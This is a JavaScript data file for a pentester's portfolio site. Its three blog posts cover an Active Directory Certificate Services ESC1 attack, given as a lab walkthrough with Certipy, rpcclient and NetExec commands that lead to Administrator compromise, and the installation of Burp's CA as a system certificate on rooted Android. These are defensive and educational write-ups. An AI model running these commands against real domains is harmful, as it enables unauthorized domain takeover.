/* Edit this file to add articles, projects, certifications and videos. */
window.PORTFOLIO_DATA = {
  profile: {
    name: "Atharva Nanche",
    email: "atharvananche001@gmail.com",
    linkedin: "https://www.linkedin.com/in/atharva-nanche-393a651ba/",
    github: "https://github.com/PentestBuddy01",
    youtube: "https://www.youtube.com/"
  },
  categories: [
    {id:"web-api",label:"Web / API"},
    {id:"mobile",label:"Mobile"},
    {id:"thick-client",label:"Thick Client"},
    {id:"cloud",label:"Cloud"},
    {id:"devsecops",label:"DevSecOps"},
    {id:"source-code-review",label:"Source Code Review"},
    {id:"ai-llm",label:"AI / LLM Security"},
    {id:"infrastructure",label:"Infrastructure"}
  ],
 /* IMAGES: put screenshots in assets/POC/<date>/<category>/01.png, 02.png ...
     then write [[img:1|Caption]] inside content. Add |m for phone screenshots: [[img:5|Caption|m]] */
  posts: [
{slug:"escalating-to-domain-admin-via-esc1-in-ad-cs",title:"ESC1",category:"infrastructure",date:"2026-11-09",readTime:"4 min read",excerpt:"A walkthrough of an ESC1 misconfiguration in Active Directory Certificate Services that let a low-privileged domain user request a certificate for the Administrator account and fully compromise the domain.",featured:false,tags:["Active Directory","AD CS","Privilege Escalation","Certipy","ESC1"],content:`
<p>Active Directory Certificate Services (AD CS) is a common source of privilege escalation paths, and one of the most reliable is ESC1: a certificate template that lets the requester supply their own Subject Alternative Name. When combined with weak enrollment permissions, this allows any domain user to request a certificate that authenticates as someone else entirely &mdash; including a Domain Admin.</p>
<div class="callout">Perform testing only against systems you own or are explicitly authorized to assess. The steps below were carried out against an authorized test environment.</div>
<h2>1. The scenario: VPN access for personal devices</h2>
<p>The issue surfaced out of a routine business need. Remote workers wanted to connect to the company VPN from personal laptops, but IT couldn't install company certificates on devices it didn't manage. The compromise was a certificate template, <code>Certificate1</code>, that let users request their own certificates for personal devices by typing in their username at enrollment time &mdash; a setting known as "Supply in request."</p>
<h2>2. What is ESC1?</h2>
<p>ESC1 exploits certificate templates that allow attackers to specify arbitrary Subject Alternative Names (SANs). With "Supply in request" enabled, the vulnerability requires four conditions to line up on a template:</p>
<ol>
<li>The <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag is enabled</li>
<li>The template includes the Client Authentication EKU (Extended Key Usage)</li>
<li>Domain Users (or Authenticated Users) have enrollment permissions</li>
<li>No manager approval is required before a certificate is issued</li>
</ol>
<p>Put together, any authenticated low-privileged user can request a certificate that claims to belong to a Domain Admin.</p>
<h2>3. Finding vulnerable certificate templates</h2>
<p>The first step is enumeration. Certipy's <code>find</code> module flags templates matching the ESC1 pattern directly:</p>
<pre><code>certipy-ad find -u Pentest@insecurenova.com -p 'P3nt3st@12345' -vulnerable -enable -stdout -dc-ip 10.0.1.10</code></pre>
[[img:1|Certipy find output listing the CA and discovered vulnerability]]
[[img:2|Certipy flags ESC1 on the Certificate1 template]]
<h2>4. Confirming the vulnerable settings</h2>
<p>The Certipy output confirms every piece needed for ESC1, matching it against the certificate authority and template configuration.</p>
<p>The certificate authority issuing certificates is INSECURENOVA-CA:</p>
[[img:3|Certificate authority details for INSECURENOVA-CA]]
<p>The vulnerable template is named Certificate1:</p>
[[img:4|Template name: Certificate1]]
<p>The template is enabled for issuance:</p>
[[img:5|Certificate1 shown as an enabled template]]
<p>Its Extended Key Usage includes Client Authentication:</p>
[[img:6|Extended Key Usage set to Client Authentication]]
<p>"Enrollee Supplies Subject" is set to true, meaning any Domain or Authenticated User can request a certificate for a high-privilege account such as a Domain Admin:</p>
[[img:7|Enrollee Supplies Subject set to true]]
<p>And enrollment rights extend to Domain Users:</p>
[[img:8|Enrollment rights granted to Domain Users and Authenticated Users]]
<h2>5. Requesting a certificate as Domain Admin</h2>
<p>With the vulnerable template confirmed, the next step is to resolve the SID of the target account to impersonate &mdash; in this case, the built-in Administrator. <code>rpcclient</code> handles the lookup:</p>
<pre><code>rpcclient -U 'insecurenova.com/Pentest%P3nt3st@12345' 10.0.1.10 -c "lookupnames administrator"</code></pre>
[[img:9|rpcclient resolving the SID for the Administrator account]]
<p>With the SID in hand, Certipy requests a certificate for the Administrator account using the vulnerable template:</p>
<pre><code>certipy-ad req -u Pentest@insecurenova.com -p 'P3nt3st@12345' -ca INSECURENOVA-CA -template Certificate1 -upn administrator@insecurenova.com -dc-ip 10.0.1.10 -target 10.0.1.20 -sid &lt;administrator-sid&gt;</code></pre>
[[img:10|Certipy successfully requesting a certificate as Administrator]]
<h2>6. From certificate to domain compromise</h2>
<p>The issued certificate can be exchanged for a Kerberos TGT and the account's NT hash:</p>
<pre><code>certipy-ad auth -pfx administrator.pfx -username administrator -domain insecurenova.com -dc-ip 10.0.1.10</code></pre>
[[img:11|Certipy authenticating with the certificate to retrieve a TGT and NT hash]]
<p>From there, the recovered hash authenticates directly against the domain controller, confirming full domain compromise:</p>
<pre><code>netexec smb 10.0.0.10 -u administrator -H 'a5ac77f15557302de83dcbd3df461f5c'</code></pre>
[[img:12|NetExec authenticating as Administrator using the recovered hash]]
<h2>7. Prevention</h2>
<ul>
<li><strong>Disable "Supply in request" on the template.</strong> Uncheck the option in the Subject Name tab of the certificate template properties, and instead configure it to build the subject from Active Directory information using the User Principal Name (UPN) or Common Name (CN).</li>
<li><strong>Enforce manager approval.</strong> If "Supply in request" is genuinely required for a specific business case, enable "CA administrator approval" on the Issuance Requirements tab so certificates aren't issued automatically.</li>
</ul>
<h2>Closing thought</h2>
<p>ESC1 is a reminder that convenience-driven configuration changes &mdash; here, solving a VPN onboarding problem &mdash; can quietly open a direct path to Domain Admin. Certificate templates deserve the same scrutiny as any other high-privilege AD object, and "Supply in request" should be treated as a red flag whenever it's paired with broad enrollment rights and no approval workflow.</p>`},
{slug:"installing-burp-suite-ca-system-certificate-android",title:"Installing Burp Suite's CA as a System Certificate on Android",category:"mobile",date:"2026-11-03",readTime:"5 min read",excerpt:"Learn how to export Burp Suite's CA certificate, convert it to the hashed PEM format Android expects, and install it as a system certificate on a rooted device or emulator so even apps that reject user-installed CAs can be intercepted.",featured:false,tags:["Android","Burp Suite","HTTPS Interception","System CA","Mobile Pentesting"],content:`
<p>Want to intercept all HTTPS traffic from Android apps, even those that block user-installed certificates? This guide walks through installing Burp Suite's CA certificate as a system certificate on a rooted Android device or emulator. That gives you full traffic visibility and lets you test even the most locked-down apps.</p>

<div class="callout">Perform testing only against systems you own or are explicitly authorized to assess. Modifying the system certificate store of a device is intended for your own test devices and emulators.</div>

<h2>1. Why a system certificate?</h2>
<p>Installing the Burp CA as a system certificate has two main benefits:</p>
<ul>
<li><strong>Intercept all HTTPS traffic, system-wide:</strong> even apps that reject user-installed certificates will trust a system-installed Burp CA, allowing full interception.</li>
<li><strong>Bypass network_security_config.xml restrictions:</strong> Android 7.0+ requires apps to explicitly allow user CAs, whereas system certificates are trusted by default.</li>
</ul>

<h2>2. Exporting the Burp Suite certificate (DER format)</h2>
<p>In Burp Suite, navigate to <strong>Proxy</strong> &gt; <strong>Proxy settings</strong>.</p>
[[img:1|Burp Suite: Proxy > Proxy settings]]
<p>Select the <strong>Import / export CA certificate</strong> button.</p>
[[img:2|Import / export CA certificate button]]
<p>Choose <strong>Certificate in DER format</strong>, then click <strong>Next</strong>.</p>
[[img:3|Export option: Certificate in DER format]]
<p>Click <strong>Select file</strong>, choose the location where you want to save the certificate, and name the file <code>Burp.der</code>.</p>
[[img:4|Select file button]]
[[img:5|Saving the certificate as Burp.der]]
[[img:6|Export path showing Burp.der]]
<p>Click <strong>Next</strong> to complete the export process.</p>
[[img:7|Certificate successfully exported]]
<p>Finally, navigate to the location where you saved the <code>Burp.der</code> file.</p>
[[img:8|Burp.der saved on the desktop]]

<h2>3. Converting DER to PEM format</h2>
<p>Copy the <code>Burp.der</code> file to your Kali Linux machine.</p>
[[img:9|Burp.der copied to Kali Linux]]
<p>Open a terminal, navigate to the folder where you pasted <code>Burp.der</code>, and run the following commands. The second command prints the subject hash (here <code>9a5ba575</code>), which is used as the filename Android expects, with a <code>.0</code> suffix.</p>
<pre><code>openssl x509 -inform DER -in Burp.der -out Burp.pem
openssl x509 -inform PEM -subject_hash_old -in Burp.pem | head -1
cp Burp.pem 9a5ba575.0</code></pre>
[[img:10|Converting the certificate and generating the hash]]
<p>The folder now contains <code>9a5ba575.0</code> alongside <code>Burp.der</code> and <code>Burp.pem</code>.</p>
[[img:11|Resulting files: 9a5ba575.0, Burp.der, Burp.pem]]

<h2>4. Pushing 9a5ba575.0 to the device or emulator</h2>
<p>Connect to your emulator. In this walkthrough I am using the Nox emulator.</p>
[[img:12|Nox emulator running]]
<p>Open a command prompt and run the following commands:</p>
<pre><code>adb devices
adb push 9a5ba575.0 /data/local/tmp
adb shell
mount -o rw,remount / | mount -o rw,remount /system
cp /data/local/tmp/9a5ba575.0 /system/etc/security/cacerts/
cd /system/etc/security/cacerts/
chmod 644 9a5ba575.0</code></pre>
[[img:13|Pushing the certificate and setting permissions with adb]]

<h2>5. Verifying the installation</h2>
<p>Open the Nox emulator and go to <strong>Settings</strong> &gt; <strong>Encryption &amp; Credentials</strong> &gt; <strong>Trusted Credential</strong> &gt; <strong>SYSTEM</strong>. The Burp CA should now be listed among the system certificates.</p>
[[img:14|Burp CA listed under SYSTEM trusted credentials|m]]

<h2>Closing thought</h2>
<p>With the Burp CA installed in the system store, apps that ignore user-installed certificates will now trust your proxy, giving you visibility into traffic that would otherwise stay hidden during mobile application testing.</p>`},
{slug:"installing-burp-ca-system-certificate-android-11-magisk",title:"Installing Burp Suite's CA as a System Certificate on Android 11+ with Magisk",category:"mobile",date:"2026-10-31",readTime:"10 min read",excerpt:"Android 11+ makes /system effectively read-only, so the old remount-and-copy trick no longer works. Here is how to overlay Burp's CA as a system certificate using a systemless Magisk module, with proof-of-concept screenshots for every step.",featured:false,tags:["Android","Burp Suite","Magisk","Mobile Security"],content:`
      <p>Intercepting HTTPS traffic from Android apps is a core part of mobile security testing. Since Android 7, apps ignore user-installed CAs unless they explicitly opt in through <code>network_security_config.xml</code>. Installing Burp's CA as a system certificate removes that restriction, but on Android 11+ it takes a different approach than it used to.</p>
      <h2>1. Why a system certificate?</h2><p>Certificates in the system store are trusted by default. Once Burp's CA is installed there, you can intercept HTTPS traffic system-wide, including from apps that reject user-installed certificates.</p>
      <h2>2. Why the old method no longer works</h2><p>On earlier Android versions, a tester with root could remount <code>/system</code> as read-write and copy the CA into <code>/system/etc/security/cacerts/</code>. Newer versions use system-as-root, dynamic partitions, and Android Verified Boot 2.0, so <code>/system</code> is strictly read-only and integrity-checked, even on many rooted devices. Remounting it is difficult or impossible without advanced methods such as Magisk modules or modified boot images.</p>
      <div class="callout">Perform testing only on devices and applications you own or are explicitly authorized to assess. This technique requires a rooted test device, so do not use your personal daily-driver phone.</div>
      <h2>3. Export Burp's CA certificate (DER)</h2><p>In Burp Suite, go to <strong>Proxy &gt; Proxy settings</strong>.</p>
      [[img:1|Proxy > Proxy settings in Burp Suite]]
      <p>Click <strong>Import / export CA certificate</strong>.</p>
      [[img:2|Import / export CA certificate]]
      <p>Choose <strong>Certificate in DER format</strong> and click <strong>Next</strong>.</p>
      [[img:3|Select Certificate in DER format]]
      <p>Click <strong>Select file</strong>, choose where to save the certificate, and name it <code>Burp.der</code>.</p>
      [[img:4|Choose the export location]]
      [[img:5|Save the file as Burp.der]]
      <p>Confirm the path is set, click <strong>Next</strong>, and wait for the success message.</p>
      [[img:6|Export path set]]
      [[img:7|Export completed]]
      <p>The exported <code>Burp.der</code> file now sits in the folder you chose. You can also download the certificate from <code>http://burpsuite/cert</code> in a browser that is proxied through Burp.</p>
      [[img:8|Exported Burp.der]]
      <h2>4. Convert DER to PEM and name it by hash</h2><p>Copy <code>Burp.der</code> to a Linux machine (Kali in this example).</p>
      [[img:9|Burp.der copied to Kali]]
      <p>Open a terminal in that folder and run:</p>
      <pre><code>openssl x509 -inform DER -in Burp.der -out Burp.pem
openssl x509 -inform PEM -subject_hash_old -in Burp.pem | head -1
cp Burp.pem 9a5ba575.0</code></pre>
      <p>The second command prints the subject hash (<code>9a5ba575</code> in this example). Android looks up system CAs by <code>&lt;hash&gt;.0</code> filenames, so the copied file must use the hash your own certificate returns.</p>
      [[img:10|DER to PEM conversion and subject hash]]
      <p>You should now have three files: <code>Burp.der</code>, <code>Burp.pem</code>, and the hash-named <code>9a5ba575.0</code>.</p>
      [[img:11|Generated certificate files]]
      <h2>5. Build the Magisk module</h2><p>Create a folder (for example <code>CustomCert</code>) with the following structure:</p>
      <pre><code>CustomCert/
├── module.prop
├── post-fs-data.sh
└── system/etc/security/cacerts/9a5ba575.0</code></pre>
      <p><strong>module.prop</strong> is the module's metadata file, covering name, version, author, and description. Without it, Magisk will not recognize the folder as a valid module.</p>
      <pre><code>id=custom_cert_module
name=Custom System Certificate
version=1.0
versionCode=1
author=You
description=Installs custom certificate into system cacerts</code></pre>
      [[img:12|module.prop]]
      <p><strong>post-fs-data.sh</strong> tells Android which interpreter runs the script. <code>#!</code> marks an interpreter directive and <code>/system/bin/sh</code> is Android's default shell.</p>
      <pre><code>#!/system/bin/sh</code></pre>
      [[img:13|post-fs-data.sh]]
      <p><strong>system/etc/security/cacerts/9a5ba575.0</strong> is the certificate itself. The path mirrors Android's system CA store at <code>/system/etc/security/cacerts/</code>, and Magisk overlays it at boot.</p>
      [[img:14|Certificate inside the module's system path]]
      <p>This is the final module layout:</p>
      [[img:15|Module folder contents]]
      <p>Select the three items (<code>module.prop</code>, <code>post-fs-data.sh</code>, and the <code>system</code> folder) and compress them into <code>CustomCert.zip</code>. Zip the contents, not the parent folder, so the files sit at the root of the archive.</p>
      [[img:16|Compress the three items to ZIP]]
      [[img:17|CustomCert.zip created]]
      <h2>6. Load the module in Magisk</h2><p>Transfer <code>CustomCert.zip</code> to the device (Android 11+).</p>
      [[img:18|Module transferred to the device]]
      <p>Open the <strong>Magisk</strong> app.</p>
      [[img:19|Open the Magisk app|m]]
      <p>Go to the <strong>Modules</strong> tab.</p>
      [[img:20|Modules tab|m]]
      <p>Tap <strong>Install from storage</strong>, select <code>CustomCert.zip</code>, and confirm with <strong>OK</strong>.</p>
      [[img:21|Install from storage|m]]
      <p>Once the log shows the installation finished successfully, tap <strong>Reboot</strong>.</p>
      [[img:22|Module installed, tap Reboot|m]]
      <h2>7. Verify the installation</h2><p>After the reboot, open <strong>Settings</strong> and search for <strong>Trusted certificates</strong>. Under the <strong>System</strong> tab, scroll to <strong>PortSwigger CA</strong>. If it is listed and enabled, the Burp CA is now trusted as a system certificate.</p>
      [[img:23|PortSwigger CA listed as a system certificate|m]]
      <h2>Important: this is not a one-time setup</h2><p>If the Burp CA changes (for example, you regenerate the certificate or use a different Burp installation), the subject hash changes too. Because Android relies on the hash-based filename, you must re-export the certificate, regenerate the hash, rebuild the module, and reinstall it each time.</p>
      <h2>Closing thought</h2><p>Magisk's systemless approach overlays the Burp CA at boot without modifying the actual system partition. The certificate is trusted as a system CA while system integrity and boot verification stay intact, which makes full HTTPS interception practical on modern Android.</p>`}
  ],
  projects: [
    {slug:"Android-PT",title:"Android Pentesting",status:"Tools & Testcases",summary:"My Android Pentesting Toolkit",description:"Android pentesting checklist to cover maximum testcases",stack:["Android","Mobile","DAST","SAST"],github:"https://github.com/PentestBuddy01/AndroidPentest",featured:true}
  ],
  certifications: [
    {id:"ceh",name:"Certified Ethical Hacker (CEH)",issuer:"EC-Council",year:"2025",certificate:"assets/certificates/ceh.pdf",summary:"Ethical hacking and security assessment certification."},
    {id:"ejptv2",name:"eJPTv2",issuer:"INE Security",year:"2024",credential:"https://certs.ine.com/eb9c31e7-d3e3-4319-b299-7df0d071af31",certificate:"assets/certificates/ejptv2.pdf",summary:"Junior penetration testing certification."}
    
  ],
  videos: [
    {title:"Container Chaos",description:"Docker and containers are everywhere, but misconfigurations can quickly turn them into serious security risks.",youtubeId:"VLMGRsYpQCk",event:"Foxxcon"},
    {title:"OAuth Misconfiguration",description:"Developers in the room were shocked to see how tiny configuration mistakes can open the door to big-impact vulnerabilities. ",youtubeId:"SZeP6Jd2ANs",event:"Foxxcon"},
    {title:"Prototype Pollution",description:"Ever wondered how a single vulnerability could let attackers take over your JavaScript app? Watch this explosive live demo as Redfox Security and Atharva Nanche dive into the dark world of Prototype Pollution — a critical but often misunderstood security flaw.",youtubeId:"AMQP66kCQKA",event:"Foxxcon"}
    ]
};
